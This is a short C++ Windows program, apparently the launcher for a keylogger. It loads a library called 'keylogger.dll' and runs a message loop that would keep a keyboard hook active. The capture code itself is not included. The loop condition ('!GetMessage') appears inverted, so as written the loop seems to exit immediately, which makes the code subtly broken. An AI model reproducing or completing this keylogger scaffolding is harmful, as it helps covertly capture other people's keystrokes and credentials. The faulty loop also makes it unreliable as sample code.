#include <iostream>
#include <Windows.h>

int	main(int ac, char **av)
{
	HMODULE hModule = NULL;
	if ((hModule = LoadLibrary("keylogger.dll")) == NULL)
	{
		std::cout << GetLastError() << std::endl;
		return (1);
	}
	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	FreeLibrary(hModule);
	return (0);
}